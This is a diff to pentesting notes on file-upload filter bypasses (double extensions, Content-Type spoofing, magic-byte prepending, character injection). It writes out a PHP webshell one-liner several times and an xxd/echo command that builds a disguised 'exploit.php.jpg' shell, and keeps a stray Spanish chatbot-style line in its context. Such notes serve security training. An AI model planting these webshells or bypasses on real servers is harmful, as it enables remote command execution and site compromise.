@@ -9,9 +9,7 @@ A **double extension** attack involves uploading a file with two extensions, suc
 1. **Create the Malicious Script** 
 ```bash
 # PHP Webshell example
-<?php
-system($_GET['cmd']);
-?>
+<?php system($_GET['cmd']); ?>
 ```
 
 2. **Rename the File with Double Extensions**
@@ -75,19 +73,24 @@ done
 
 
 ## MIME Type Spoofing
+When uploading a file, the request includes the following header:
 
-**MIME type** (Multipurpose Internet Mail Extensions) is used by web servers and applications to determine the file type based on its content. Many applications check the MIME type to filter uploads. However, attackers can modify the MIME type in order to bypass restrictions.
+```html
+Content-Type: image/jpeg
+```
+
+This value is:
+- Set by the browser
+- Based on the file extension
+- Fully controllable by the attacker
 
 #### Example
 
-- **Legitimate MIME Type**: When uploading an image, the MIME type might be something like `image/jpeg` or `image/png`.
-- **MIME Spoofing**: An attacker could change the MIME type of a PHP file to `image/jpeg`. This could bypass the file type checks performed by the server if it is only checking the MIME type for validation, without inspecting the actual file content.
-
+- **Legitimate Content-Type**: When uploading an image, the MIME type might be something like `image/jpeg` or `image/png`.
+- **Content-Type Spoofing**: An attacker could change the MIME type of a PHP file to `image/jpeg`. This could bypass the file type checks performed by the server if it is only checking the MIME type type for validation, without inspecting the actual file content.
 
 
 ---
-
-
 
 ## Magic Bytes
 **Magic bytes** are unique sequences of bytes at the beginning of a file that indicate its format. In file upload attacks, attackers may use magic bytes to **bypass content validation filters** by making a malicious file appear to be a legitimate one.
@@ -114,26 +117,11 @@ These bytes are used by tools and some security filters to verify that the file 
 
 #### Bypassing Upload Filters Using Magic Bytes
 
-Attackers prepend valid magic bytes of a trusted file type to a malicious file to **pass content-based filters**.
-
-```php
-FFD8FFDB;
-<?php system($_GET['cmd']); ?>
-```
-
-This appears to be a **valid GIF** due to the magic bytes `GIF89a`, but it contains PHP code that may be executed if the server doesn't validate the full file properly.
-
-- Save it as `shell.php.jpg`
-- Upload it if `.jpg` is allowed
-- Access it through its URL
-- If the server executes based on handler (.php inside filename or route), the PHP code may run
-
-Another options is to use the following command that converts the hexadecimal string into binary and writes it as the header of a new file.
+To insert the Magic Bytes into the upload file is necessary to convert the hexadecimal string into binary:
 
 ```php
 echo 'FFD8FFDB' | xxd -r -p > exploit.php.jpg && echo '<?php system($_GET["cmd"]); ?>' >> exploit.php.jpg
 ```
-
 
 
 ---
@@ -160,7 +148,7 @@ Aquí tienes la sección adaptada a tu formato de apuntes, clara y directa:
 
 ---
 
-## Character Injection
+## PHP Character Injection
 
 Some applications validate file uploads by checking the extension, but they may misinterpret filenames if special characters are injected.
 
